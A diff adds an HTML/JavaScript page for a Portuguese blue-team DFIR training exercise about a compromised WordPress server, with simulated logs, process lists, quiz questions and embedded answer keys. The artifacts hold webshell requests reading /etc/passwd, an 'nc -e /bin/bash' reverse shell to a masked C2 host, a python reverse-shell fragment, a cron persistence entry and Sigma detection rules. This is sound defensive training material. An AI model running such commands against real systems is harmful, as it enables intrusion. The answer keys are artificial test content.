@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Operação Silent Breach — Desafio Blue Team</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e13; --panel:#0e141b; --panel2:#111923; --line:#1d2732; --line2:#2a3742;
+  --txt:#c8d4cf; --mut:#6f8290; --acc:#3ddc97; --acc-bg:rgba(61,220,151,.07);
+  --red:#ff5d5d; --red-bg:rgba(255,93,93,.08); --amber:#ffb454; --amber-bg:rgba(255,180,84,.08);
+  --mono:'IBM Plex Mono',monospace; --disp:'Space Grotesk',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{
+  background:var(--bg); color:var(--txt); font-family:var(--mono); font-size:14px;
+  background-image:
+    linear-gradient(rgba(255,255,255,.015) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.015) 1px, transparent 1px);
+  background-size:34px 34px;
+}
+::selection{background:var(--acc); color:#06120c}
+button{font-family:var(--mono)}
+
+/* ---------- estrutura ---------- */
+.app{display:grid; grid-template-rows:58px 1fr; height:100vh; opacity:0; transition:opacity .5s}
+body.ready .app{opacity:1}
+header{
+  display:flex; align-items:center; gap:14px; padding:0 20px;
+  border-bottom:1px solid var(--line); background:rgba(10,14,19,.9);
+}
+.led{width:8px;height:8px;border-radius:50%;background:var(--red);animation:pulse 1.2s infinite}
+body.ready .led{background:var(--acc);animation-duration:2.4s}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.brand{display:flex;align-items:center;gap:10px}
+.brand svg{width:19px;height:19px;color:var(--acc)}
+.brand b{font:700 15px var(--disp); letter-spacing:.5px; color:#e8f2ec}
+.brand small{color:var(--mut); font-size:10.5px; letter-spacing:2px; display:block; margin-top:1px}
+.hspacer{flex:1}
+.hstat{display:flex;align-items:center;gap:8px;font:500 12px var(--mono);color:var(--mut);
+  border:1px solid var(--line); padding:5px 12px; letter-spacing:1px}
+.hstat svg{width:13px;height:13px;color:var(--acc)}
+.hstat b{color:var(--txt)}
+
+.shell{display:grid; grid-template-columns:264px 1fr; overflow:hidden}
+nav{
+  border-right:1px solid var(--line); background:var(--panel);
+  padding:18px 0; overflow-y:auto;
+}
+.nav-label{font-size:10px;letter-spacing:2.5px;color:var(--mut);padding:0 18px 10px}
+.nav-item{
+  width:100%; text-align:left; background:none; border:none; cursor:pointer;
+  display:flex; align-items:center; gap:10px; padding:11px 18px; color:var(--txt);
+  border-left:3px solid transparent; font-size:12.5px; letter-spacing:.5px;
+}
+.nav-item:hover{background:var(--panel2)}
+.nav-item.active{border-left-color:var(--acc); background:var(--acc-bg)}
+.nav-item .nidx{color:var(--mut); font-size:11px; min-width:44px}
+.nav-item.active .nidx{color:var(--acc)}
+.nav-item .nprog{margin-left:auto; font-size:10.5px; color:var(--mut); border:1px solid var(--line); padding:1px 7px}
+.nav-item.locked{color:#4a5860; cursor:not-allowed}
+.nav-item.locked .nprog{opacity:.5}
+.nav-item.done .nprog{color:var(--acc); border-color:var(--acc)}
+.nav-sep{height:1px;background:var(--line);margin:12px 18px}
+.nav-info{padding:4px 18px; font-size:11px; color:var(--mut); line-height:1.7}
+.nav-info b{color:var(--amber)}
+
+#content{overflow-y:auto; padding:30px 38px 70px}
+.phase{display:none; max-width:960px; position:relative}
+.phase.active{display:block; animation:fadeUp .35s ease}
+@keyframes fadeUp{from{opacity:0; transform:translateY(8px)} to{opacity:1}}
+.phase-kicker{font-size:11px; letter-spacing:3px; color:var(--acc)}
+.phase h2{font:700 30px var(--disp); color:#eaf4ee; margin:6px 0 4px}
+.phase-desc{color:var(--mut); font-size:13px; margin-bottom:8px}
+
+/* ---------- janelas de terminal / artefatos ---------- */
+.term{border:1px solid var(--line); background:#0b1017; margin:18px 0 8px; overflow:hidden}
+.term-head{display:flex; align-items:center; gap:8px; padding:8px 12px; border-bottom:1px solid var(--line); background:var(--panel)}
+.term-head .d{width:9px;height:9px;border-radius:50%;background:#26323d}
+.term-title{font-size:11px; color:var(--mut); letter-spacing:.5px; margin-left:6px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis}
+.term-body{padding:12px 6px; overflow-x:auto; font-size:12.8px; line-height:1.75}
+.logline{display:flex; gap:12px; padding:0 10px; white-space:pre}
+.logline .ln{color:#38464f; min-width:2ch; text-align:right; user-select:none}
+.logline:hover{background:var(--acc-bg); cursor:help}
+.logline.mal .lc{color:#ff9d9d}
+.logline.mal .ln{color:#a05050}
+.psrow{display:grid; grid-template-columns:70px 60px 1fr; padding:0 10px; white-space:pre}
+.psrow span:nth-child(1),.psrow span:nth-child(2){color:var(--mut)}
+.tip-hint{font-size:11px; color:var(--mut); margin:6px 2px 0; letter-spacing:.5px}
+.duo{display:grid; grid-template-columns:1fr 1fr; gap:14px}
+.art-note{border-left:3px solid var(--line2); padding:8px 14px; color:var(--mut); font-size:12px; margin-top:14px; line-height:1.7}
+.art-note b{color:var(--amber)}
+
+/* ---------- questões ---------- */
+.q{border:1px solid var(--line); background:var(--panel); border-left:3px solid var(--line2);
+   padding:18px 20px; margin-top:18px; position:relative}
+.q.solved{border-left-color:var(--acc)}
+.q-head{display:flex; align-items:baseline; gap:12px; flex-wrap:wrap}
+.q-num{font-size:11px; color:var(--acc); border:1px solid var(--acc); padding:2px 7px; letter-spacing:1px; flex:none}
+.q-prompt{font:500 15.5px var(--disp); color:#e4efe8; flex:1; min-width:200px}
+.q-pts{font-size:11px; color:var(--mut); border:1px solid var(--line2); padding:2px 8px; letter-spacing:1px; flex:none}
+.q-pts.gain{color:var(--acc); border-color:var(--acc)}
+.q-body{margin-top:14px}
+.q.solved .q-body{pointer-events:none; opacity:.8}
+.q-foot{display:flex; align-items:center; gap:14px; margin-top:14px; flex-wrap:wrap}
+.q.solved .q-foot{display:none}
+.attempts{font-size:11px; color:var(--mut); letter-spacing:1px}
+.q-explain,.q-hintbox{font-size:12.5px; line-height:1.7; padding:11px 14px; margin-top:12px}
+.q-explain{border-left:3px solid var(--acc); background:var(--acc-bg); color:#cfe8db}
+.q-hintbox{border-left:3px solid var(--amber); background:var(--amber-bg); color:#e8d6b8}
+.hidden{display:none !important}
+
+.btn{
+  background:transparent; border:1px solid var(--acc); color:var(--acc); cursor:pointer;
+  font:600 11.5px var(--mono); letter-spacing:2px; text-transform:uppercase; padding:9px 18px;
+  transition:background .15s, color .15s;
+}
+.btn:hover{background:var(--acc); color:#06120c}
+.btn.ghost{border-color:var(--line2); color:var(--mut)}
+.btn.ghost:hover{background:var(--line2); color:var(--txt)}
+.btn.warn{border-color:var(--amber); color:var(--amber)}
+.btn.warn:hover{background:var(--amber); color:#1c1305}
+
+/* múltipla escolha */
+.opt{display:flex; flex-wrap:wrap; align-items:baseline; gap:10px; border:1px solid var(--line);
+  padding:11px 13px; margin:7px 0; cursor:pointer; transition:border-color .15s, background .15s}
+.opt:hover{border-color:var(--line2); background:var(--panel2)}
+.opt.sel{border-color:var(--acc); background:var(--acc-bg)}
+.opt.good{border-color:var(--acc)}
+.opt.bad{border-color:var(--red); background:var(--red-bg)}
+.opt-k{font-size:11px; color:var(--acc); border:1px solid var(--line2); padding:1px 7px; flex:none}
+.opt-t{font-size:13px; flex:1}
+.opt-code{width:100%; background:#0a0f14; border:1px solid var(--line); padding:10px 12px;
+  font:12px/1.6 var(--mono); color:#a8d5c2; overflow-x:auto; white-space:pre; margin:0}
+
+/* texto livre */
+.tinput{background:#0a0f14; border:1px solid var(--line2); color:var(--txt);
+  font:13px var(--mono); padding:10px 12px; width:min(420px,100%); outline:none}
+.tinput:focus{border-color:var(--acc)}
+.tinput.bad{border-color:var(--red)}
+
+/* classificação de processos */
+.cls-row{display:grid; grid-template-columns:1fr 118px; gap:12px; align-items:center;
+  border:1px solid var(--line); padding:9px 13px; margin:6px 0}
+.cls-cmd{font-size:12.5px; white-space:pre-wrap; word-break:break-all}
+.cls-cmd small{color:var(--mut)}
+.cls-btn{border:1px solid var(--line2); background:none; color:var(--mut); cursor:pointer;
+  font:600 10.5px var(--mono); letter-spacing:1.5px; padding:7px 4px; min-width:112px}
+.cls-btn[data-s="1"]{border-color:var(--acc); color:var(--acc)}
+.cls-btn[data-s="2"]{border-color:var(--red); color:var(--red)}
+.cls-btn.ok{border-color:var(--acc); background:var(--acc-bg)}
+.cls-btn.bad{border-color:var(--red); background:var(--red-bg)}
+
+/* ordenação */
+.ord-wrap{display:grid; grid-template-columns:1fr 1fr; gap:18px}
+.ord-col-t{font-size:10.5px; letter-spacing:2px; color:var(--mut); margin-bottom:8px}
+.pool-chip{display:flex; gap:10px; align-items:center; border:1px solid var(--line2);
+  padding:8px 11px; margin:6px 0; cursor:pointer; font-size:12.5px; user-select:none}
+.pool-chip:hover{border-color:var(--acc); background:var(--acc-bg)}
+.pool-chip.used{display:none}
+.pool-chip .k{color:var(--acc); font-weight:600; font-size:11px; border:1px solid var(--line2); padding:0 6px}
+.slot{display:flex; gap:10px; align-items:center; border:1px dashed var(--line2);
+  min-height:38px; padding:7px 11px; margin:6px 0; font-size:12.5px; color:var(--mut)}
+.slot.filled{border-style:solid; border-color:var(--line2); color:var(--txt); cursor:pointer}
+.slot.filled:hover{border-color:var(--red)}
+.slot .k{color:var(--acc); font-weight:600; font-size:11px; border:1px solid var(--line2); padding:0 6px; flex:none}
+.slot .sn{color:#3d4c56; font-size:11px; min-width:2ch}
+.slot.ok{border-color:var(--acc)}
+.slot.bad{border-color:var(--red); background:var(--red-bg)}
+
+/* múltipla marcação */
+.mopt{display:flex; gap:11px; align-items:flex-start; border:1px solid var(--line);
+  padding:10px 13px; margin:6px 0; cursor:pointer; font-size:13px}
+.mopt:hover{border-color:var(--line2); background:var(--panel2)}
+.mopt input{accent-color:var(--acc); margin-top:2px; flex:none}
+.mopt.bad{border-color:var(--red); background:var(--red-bg)}
+.mopt.miss{border-color:var(--amber); background:var(--amber-bg)}
+
+/* banner de fase concluída / carimbo */
+.done-banner{border:1px solid var(--acc); background:var(--acc-bg); padding:16px 18px;
+  display:flex; align-items:center; gap:14px; flex-wrap:wrap; margin-top:22px;
+  animation:fadeUp .4s ease}
+.done-banner svg{width:20px;height:20px;color:var(--acc);flex:none}
+.done-banner span{font:600 14px var(--disp); letter-spacing:1px; color:var(--acc)}
+.stamp{position:absolute; top:20px; right:24px; border:2px solid var(--acc); color:var(--acc);
+  padding:6px 16px; font:600 13px var(--mono); letter-spacing:4px;
+  transform:rotate(-7deg) scale(0); opacity:0; pointer-events:none}
+.phase.done .stamp{animation:stampIn .45s cubic-bezier(.2,1.7,.4,1) forwards}
+@keyframes stampIn{to{transform:rotate(-7deg) scale(1); opacity:1}}
+
+/* ---------- intro ---------- */
+#intro{position:fixed; inset:0; background:#05070a; z-index:100; display:flex;
+  align-items:center; justify-content:center; transition:opacity .5s; cursor:pointer}
+#intro.hide{opacity:0; pointer-events:none}
+.intro-card{width:min(700px,92vw)}
+.intro-tag{display:inline-block; border:1px solid var(--red); color:var(--red);
+  font:600 11px var(--mono); letter-spacing:3px; padding:5px 12px; margin-bottom:18px}
+.intro-lines{font-size:13px; line-height:2; color:#9fb3ab; min-height:190px; white-space:pre-wrap}
+.intro-lines .crit{color:var(--red)}
+.intro-lines .ok{color:var(--acc)}
+.cur{display:inline-block; width:8px; height:15px; background:var(--acc);
+  vertical-align:-2px; animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.intro-foot{margin-top:26px; opacity:0; transition:opacity .4s}
+.intro-foot.show{opacity:1}
+.intro-title{font:700 34px var(--disp); color:#eaf4ee; margin-bottom:18px}
+.intro-title small{display:block; font:500 12px var(--mono); letter-spacing:3px; color:var(--acc); margin-bottom:8px}
+
+/* ---------- modal relatório ---------- */
+#report{position:fixed; inset:0; background:rgba(5,7,10,.85); z-index:110;
+  display:none; align-items:center; justify-content:center; padding:20px}
+#report.show{display:flex}
+.rep-card{width:min(600px,100%); background:var(--panel); border:1px solid var(--line2); padding:28px}
+.rep-card h3{font:700 24px var(--disp); color:#eaf4ee}
+.rep-rank{font:700 17px var(--disp); color:var(--acc); letter-spacing:2px; margin:6px 0 18px}
+.rep-grid{display:flex; gap:14px; margin-bottom:18px}
+.rep-box{flex:1; border:1px solid var(--line); padding:12px 14px}
+.rep-box small{display:block; font-size:10px; letter-spacing:2px; color:var(--mut); margin-bottom:4px}
+.rep-box b{font:700 22px var(--disp); color:var(--acc)}
+.rep-table{width:100%; border-collapse:collapse; font-size:12.5px; margin-bottom:22px}
+.rep-table td{padding:8px 6px; border-bottom:1px solid var(--line)}
+.rep-table td:last-child{text-align:right; color:var(--acc)}
+.rep-actions{display:flex; gap:12px; flex-wrap:wrap}
+
+/* ---------- toast / tooltip ---------- */
+#toasts{position:fixed; right:18px; bottom:18px; display:flex; flex-direction:column; gap:8px; z-index:120}
+.toast{background:#0e141b; border:1px solid var(--line2); border-left:3px solid var(--acc);
+  padding:11px 15px; font-size:12.5px; max-width:360px; animation:tIn .25s ease; color:var(--txt)}
+.toast.err{border-left-color:var(--red)}
+.toast.warn{border-left-color:var(--amber)}
+.toast.out{opacity:0; transform:translateX(12px); transition:all .3s}
+@keyframes tIn{from{opacity:0; transform:translateX(12px)} to{opacity:1}}
+#tip{position:fixed; display:none; z-index:95; background:#05080b; border:1px solid var(--line2);
+  padding:7px 11px; font-size:11.5px; color:var(--amber); max-width:320px; pointer-events:none; line-height:1.55}
+
+@media(max-width:920px){
+  .shell{grid-template-columns:1fr; grid-template-rows:auto 1fr}
+  nav{display:flex; gap:6px; overflow-x:auto; padding:10px; border-right:none; border-bottom:1px solid var(--line)}
+  .nav-label,.nav-sep,.nav-info{display:none}
+  .nav-item{white-space:nowrap; border-left:none; border-bottom:3px solid transparent}
+  .nav-item.active{border-bottom-color:var(--acc)}
+  #content{padding:22px 18px 60px}
+  .duo,.ord-wrap{grid-template-columns:1fr}
+  .rep-grid{flex-direction:column}
+}
+</style>
+</head>
+<body>
+
+<!-- ===== INTRO / ALERTA SIEM ===== -->
+<div id="intro">
+  <div class="intro-card">
+    <span class="intro-tag">ALERTA CRÍTICO — TURNO NOTURNO</span>
+    <div class="intro-lines" id="introLines"></div>
+    <div class="intro-foot" id="introFoot">
+      <div class="intro-title"><small>EXERCÍCIO BLUE TEAM · SOC NÍVEL 2</small>OPERAÇÃO SILENT BREACH</div>
+      <button class="btn" id="btnAccept">Assumir o incidente</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== APLICAÇÃO ===== -->
+<div class="app">
+  <header>
+    <span class="led"></span>
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <div><b>SILENT BREACH</b><small>SIMULAÇÃO DFIR · BLUE TEAM</small></div>
+    </div>
+    <div class="hspacer"></div>
+    <div class="hstat"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>TEMPO <b id="hClock">00:00</b></div>
+    <div class="hstat"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg>SCORE <b id="hScore">000/100</b></div>
+    <div class="hstat">FASES <b id="hPhases">0/5</b></div>
+  </header>
+
+  <div class="shell">
+    <nav id="nav"></nav>
+    <main id="content"></main>
+  </div>
+</div>
+
+<div id="tip"></div>
+<div id="toasts"></div>
+
+<!-- ===== RELATÓRIO FINAL ===== -->
+<div id="report">
+  <div class="rep-card">
+    <h3>Relatório de Encerramento</h3>
+    <div class="rep-rank" id="repRank"></div>
+    <div class="rep-grid">
+      <div class="rep-box"><small>PONTUAÇÃO FINAL</small><b id="repScore"></b></div>
+      <div class="rep-box"><small>TEMPO TOTAL</small><b id="repTime"></b></div>
+    </div>
+    <table class="rep-table"><tbody id="repBody"></tbody></table>
+    <div class="rep-actions">
+      <button class="btn" id="btnDownload">Baixar relatório</button>
+      <button class="btn ghost" id="btnRestart">Reiniciar exercício</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ================= utilidades ================= */
+const $  = s => document.querySelector(s);
+const el = (tag, cls, html) => { const d = document.createElement(tag); if (cls) d.className = cls; if (html != null) d.innerHTML = html; return d; };
+const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+const norm = s => s.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').trim();
+const pad = n => String(n).padStart(2,'0');
+const ICON_CHECK = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>';
+
+function toast(msg, type){
+  const t = el('div', 'toast' + (type ? ' ' + type : ''), msg);
+  $('#toasts').appendChild(t);
+  setTimeout(() => { t.classList.add('out'); setTimeout(() => t.remove(), 320); }, 3400);
+}
+
+/* ================= artefatos forenses ================= */
+const ARTIFACTS = {
+1: `
+<div class="term">
+  <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">analista@soc:/evidencia$ tail -n 7 /var/log/apache2/access.log — host WEB-PROD-01</span></div>
+  <div class="term-body">
+    <div class="logline" data-note="Tráfego interno legítimo — sessão normal de usuário."><span class="ln">1</span><span class="lc">192.168.1.50 - - [15/Mar/2025:03:42:11] "GET /index.php HTTP/1.1" 200 5309</span></div>
+    <div class="logline" data-note="Acesso ao /admin com redirecionamento — ainda comportamento normal."><span class="ln">2</span><span class="lc">192.168.1.50 - - [15/Mar/2025:03:42:15] "GET /admin HTTP/1.1" 302 -</span></div>
+    <div class="logline" data-note="IP externo acessando wp-login.php — recon da página de login."><span class="ln">3</span><span class="lc">45.155.x.x - - [15/Mar/2025:03:43:02] "GET /wp-login.php HTTP/1.1" 200 4021</span></div>
+    <div class="logline mal" data-note="POST com 302 logo após o GET: credenciais aceitas. Brute-force bem-sucedido."><span class="ln">4</span><span class="lc">45.155.x.x - - [15/Mar/2025:03:43:08] "POST /wp-login.php HTTP/1.1" 302 -</span></div>
+    <div class="logline mal" data-note="Webshell acessado com cmd=id — execução arbitrária de comandos confirmada."><span class="ln">5</span><span class="lc">45.155.x.x - - [15/Mar/2025:03:44:19] "GET /wp-content/uploads/shell.php?cmd=id HTTP/1.1" 200 145</span></div>
+    <div class="logline mal" data-note="Enumeração de usuários do sistema via webshell."><span class="ln">6</span><span class="lc">45.155.x.x - - [15/Mar/2025:03:44:25] "GET /wp-content/uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1870</span></div>
+    <div class="logline mal" data-note="Reverse shell para C2 externo na porta 4444. Comprometimento total do host."><span class="ln">7</span><span class="lc">45.155.x.x - - [15/Mar/2025:03:45:33] "GET /wp-content/uploads/shell.php?cmd=nc+-e+/bin/bash+185.220.x.x+4444 HTTP/1.1" 200 0</span></div>
+  </div>
+</div>
+<p class="tip-hint">Passe o mouse sobre as linhas para ver as anotações do analista de plantão.</p>`,
+
+2: `
+<div class="term">
+  <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">root@WEB-PROD-01:~$ ps aux --forest  (recorte do momento do incidente)</span></div>
+  <div class="term-body">
+    <div class="psrow"><span>USER</span><span>PID</span><span>COMANDO</span></div>
+    <div class="psrow"><span>root</span><span>1044</span><span>/usr/sbin/apache2 -k start</span></div>
+    <div class="psrow"><span>mysql</span><span>1120</span><span>/usr/sbin/mysqld</span></div>
+    <div class="psrow"><span>www-data</span><span>2381</span><span>sh -c nc -e /bin/bash 185.220.x.x 4444</span></div>
+    <div class="psrow"><span>www-data</span><span>2382</span><span>/bin/bash  (processo filho do PID 2381)</span></div>
+    <div class="psrow"><span>www-data</span><span>2389</span><span>python3 -c import socket,subprocess,os...</span></div>
+    <div class="psrow"><span>root</span><span>2401</span><span>./miner --config /tmp/.config.json</span></div>
+  </div>
+</div>
+<div class="art-note">Nota do plantão: os processos <b>www-data</b> foram iniciados segundos após a requisição do webshell. Há também arquivos ocultos (nomes iniciados por ponto) em diretórios temporários.</div>`,
+
+3: `
+<div class="duo">
+  <div class="term">
+    <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">/etc/crontab</span></div>
+    <div class="term-body">
+      <div class="logline"><span class="ln">1</span><span class="lc"># m h dom mon dow user  command</span></div>
+      <div class="logline"><span class="ln">2</span><span class="lc">17 *  * * *  root  cd / &amp;&amp; run-parts --report /etc/cron.hourly</span></div>
+      <div class="logline mal" data-note="Execução periódica a cada 5 minutos de binário em /tmp — persistência."><span class="ln">3</span><span class="lc">*/5 *  * * *  root  /tmp/.update_system &gt;/dev/null 2&gt;&amp;1</span></div>
+    </div>
+  </div>
+  <div class="term">
+    <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">/root/.ssh/authorized_keys</span></div>
+    <div class="term-body">
+      <div class="logline"><span class="ln">1</span><span class="lc">ssh-rsa AAAAB3Nza...pQ2f admin@jumpbox</span></div>
+      <div class="logline mal" data-note="Chave RSA desconhecida — comentário 'attacker@compromised'. Backdoor SSH."><span class="ln">2</span><span class="lc">ssh-rsa AAAAB3Nza...k9x2 attacker@compromised</span></div>
+    </div>
+  </div>
+</div>
+<div class="art-note">O atacante garantiu duas formas de retorno ao host. Identifique <b>quantos</b> mecanismos são, <b>qual script</b> agenda a execução e <b>como removê-los sem quebrar o acesso legítimo da equipe</b>.</div>`,
+
+4: `
+<div class="term">
+  <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">topologia do segmento — mapa de rede do SOC</span></div>
+  <div class="term-body"><div class="logline"><span class="ln">&gt;</span><span class="lc">ATACANTE (45.155.x.x)
+      │
+      ▼
+FIREWALL DE BORDA ──► WEB-PROD-01 (10.0.5.20) ──► LAN INTERNA
+      ▲                        │
+      └── C2 ativo: 185.220.x.x:4444 ◄─┘ (tráfego de SAÍDA)</span></div></div>
+</div>
+<div class="art-note">O host continua online e comunicando com o C2. Cada decisão altera o estado do sistema — <b>a ordem das ações importa</b>: ações prematuras podem destruir evidências; ação tardia amplia o dano.</div>`,
+
+5: `
+<div class="term">
+  <div class="term-head"><span class="d"></span><span class="d"></span><span class="d"></span><span class="term-title">resumo do incidente #IR-2025-0315 — pós-erradicação</span></div>
+  <div class="term-body">
+    <div class="logline"><span class="ln">&gt;</span><span class="lc">Vetor ........ brute-force em wp-login.php + upload de webshell</span></div>
+    <div class="logline"><span class="ln">&gt;</span><span class="lc">Impacto ...... RCE como www-data, escalação parcial, minerador em /tmp</span></div>
+    <div class="logline"><span class="ln">&gt;</span><span class="lc">Persistência . cron (/tmp/.update_system) + chave SSH não autorizada</span></div>
+    <div class="logline"><span class="ln">&gt;</span><span class="lc">Pergunta ..... como impedir que isto aconteça novamente?</span></div>
+  </div>
+</div>`
+};
+
+/* ================= questões ================= */
+const QUESTIONS = [
+/* ---- FASE 1 — 20 pts ---- */
+{ id:'q1', phase:1, type:'mc', pts:10, prompt:'Qual foi o vetor de ataque inicial?',
+  options:[
+    {t:'Exploração de RCE remoto no Apache2'},
+    {t:'Brute-force no wp-login.php seguido de upload de webshell'},
+    {t:'SQL Injection no banco MySQL'},
+    {t:'Phishing contra um administrador do WordPress'}],
+  answer:1,
+  hint:'Compare o par GET + POST em wp-login.php vindo do IP 45.155.x.x com o que acontece logo em seguida.',
+  explain:'O IP 45.155.x.x autenticou-se no wp-login.php (POST → 302) e, em seguida, o webshell aparece em /wp-content/uploads/. Vetor clássico: credenciais fracas + upload sem validação.'},
+{ id:'q2', phase:1, type:'text', pts:10, prompt:'Identifique o IoC principal — digite o nome do arquivo malicioso.',
+  match:['shell.php'], placeholder:'ex.: /caminho/arquivo.php',
+  hint:'Foi enviado para o diretório de uploads do WordPress.',
+  explain:'shell.php recebe comandos via parâmetro ?cmd= — um webshell PHP completo, permitindo RCE. Corresponde à técnica MITRE ATT&CK T1505.003 (Web Shell).'},
+
+/* ---- FASE 2 — 15 pts ---- */
+{ id:'q4', phase:2, type:'classify', pts:5, prompt:'Classifique cada processo como LEGÍTIMO ou MALICIOSO — clique no botão para alternar.',
+  rows:[
+    {pid:'1044', user:'root',     cmd:'/usr/sbin/apache2 -k start',              mal:false},
+    {pid:'1120', user:'mysql',    cmd:'/usr/sbin/mysqld',                        mal:false},
+    {pid:'2381', user:'www-data', cmd:'sh -c nc -e /bin/bash 185.220.x.x 4444',  mal:true},
+    {pid:'2382', user:'www-data', cmd:'/bin/bash  <small>(filho do PID 2381)</small>', mal:true},
+    {pid:'2389', user:'www-data', cmd:'python3 -c import socket,subprocess,os…', mal:true},
+    {pid:'2401', user:'root',     cmd:'./miner --config /tmp/.config.json',      mal:true}],
+  hint:'Processos legítimos são serviços conhecidos do host (apache2, mysqld). Desconfie de shells interativos e scripts rodando como www-data.',
+  explain:'nc com -e cria o reverse shell; bash e python3 são filhos do atacante; ./miner é o criptominerador. apache2 e mysqld são serviços nativos.'},
+{ id:'q5', phase:2, type:'text', pts:5, prompt:'Qual binário indica atividade de criptomineração?',
+  match:['miner'], placeholder:'nome do binário',
+  hint:'Roda como root, com uma configuração oculta no diretório temporário.',
+  explain:'./miner com /tmp/.config.json — padrão típico de cryptojacking pós-compromisso.'},
+{ id:'q6', phase:2, type:'text', pts:5, prompt:'Onde o atacante escondeu seus arquivos? Digite o caminho.',
+  match:['/tmp','tmp'], placeholder:'ex.: /var/…',
+  hint:'Repare nos nomes que começam com ponto — arquivos ocultos.',
+  explain:'/tmp/.config.json e /tmp/.update_system — diretório gravável por qualquer serviço + arquivos ocultos.'},
+
+/* ---- FASE 3 — 20 pts ---- */
+{ id:'q7', phase:3, type:'mc', pts:5, prompt:'Quantos mecanismos de persistência foram instalados?',
+  options:[{t:'1'},{t:'2'},{t:'3'},{t:'4'}], answer:1,
+  hint:'Um agenda execução periódica; o outro devolve acesso remoto sem senha.',
+  explain:'Dois mecanismos: o cron job em /etc/crontab e a chave SSH não autorizada em authorized_keys.'},
+{ id:'q8', phase:3, type:'text', pts:5, prompt:'Qual o nome do cron job malicioso?',
+  match:['update_system'], placeholder:'nome do script',
+  hint:'Está em /tmp e começa com ponto — disfarçado de rotina do sistema.',
+  explain:'/tmp/.update_system — finge ser uma "atualização do sistema" a cada 5 minutos.'},
+{ id:'q9', phase:3, type:'mc', pts:10, prompt:'Como remover a persistência via SSH de forma segura?',
+  options:[
+    {t:'Apagar o arquivo authorized_keys inteiro'},
+    {t:'Remover somente a chave não autorizada, auditar as demais e rotacionar credenciais'},
+    {t:'Trocar a porta padrão do SSH para 2222'},
+    {t:'Reiniciar o servidor para limpar a memória'}],
+  answer:1,
+  hint:'Apagar tudo quebra o acesso da equipe; mudar de porta não remove a chave.',
+  explain:'A chave foi adicionada ao arquivo existente: remova apenas a linha do atacante, audite as demais chaves e rotacione as credenciais do servidor.'},
+
+/* ---- FASE 4 — 30 pts ---- */
+{ id:'q10', phase:4, type:'order', pts:20, prompt:'Ordene as ações de resposta ao incidente — clique nas ações na sequência correta.',
+  items:[
+    {k:'A', t:'Bloquear o IP do atacante na firewall de borda'},
+    {k:'B', t:'Isolar o host WEB-PROD-01 da rede'},
+    {k:'C', t:'Coletar imagem forense e preservar evidências'},
+    {k:'D', t:'Remover webshell, cron job e chave SSH maliciosas'},
+    {k:'E', t:'Rotacionar todas as credenciais do servidor'},
+    {k:'F', t:'Preencher o relatório final do incidente'},
+    {k:'G', t:'Aplicar patches e atualizar o WordPress'}],
+  correct:'BACDEGF',
+  hint:'Preserve evidências antes de alterar o sistema — e só documente no fim.',
+  explain:'Isolar o host → bloquear o IP → coletar evidências → erradicar → rotacionar credenciais → aplicar patches → relatar. Alterar o sistema antes da forense destrói provas.'},
+{ id:'q11', phase:4, type:'mc', pts:10, prompt:'Qual regra Sigma detecta melhor a execução do webshell?',
+  options:[
+    {t:'Regra A', code:"detection:\n  selection:\n    cs-method: GET\n    cs-uri-stem|contains: '/uploads/'\n    cs-uri-stem|endswith: '.php'\n  condition: selection\nlevel: critical"},
+    {t:'Regra B', code:"detection:\n  selection:\n    cs-method: POST\n    cs-uri-stem|contains: '/wp-login.php'\n  condition: selection\nlevel: high"},
+    {t:'Regra C', code:"detection:\n  selection:\n    cs-uri-stem|contains: '/uploads/'\n    cs-uri-stem|endswith: '.png'\n  condition: selection\nlevel: medium"}],
+  answer:0,
+  hint:'O webshell é um .php acessado por GET dentro de /uploads/.',
+  explain:'GET em arquivos .php dentro de /uploads/ é altamente anômalo — diretórios de upload não deveriam conter PHP executável.'},
+
+/* ---- FASE 5 — 15 pts ---- */
+{ id:'q12', phase:5, type:'multi', pts:15, prompt:'Selecione todas as medidas de hardening válidas para este cenário:',
+  options:[
+    {t:'Implantar WAF (ModSecurity / OWASP CRS) na frente do WordPress', ok:true},
+    {t:'Configurar fail2ban para o wp-login.php', ok:true},
+    {t:'Desabilitar a execução de PHP em /wp-content/uploads/', ok:true},
+    {t:'Política de atualização de core e plugins do WordPress', ok:true},
+    {t:'Exigir MFA para contas administrativas', ok:true},
+    {t:'File Integrity Monitoring (FIM) em diretórios sensíveis', ok:true},
+    {t:'Reduzir a retenção de logs para apenas 24 horas', ok:false},
+    {t:'Executar o Apache como root para eliminar erros de permissão', ok:false}],
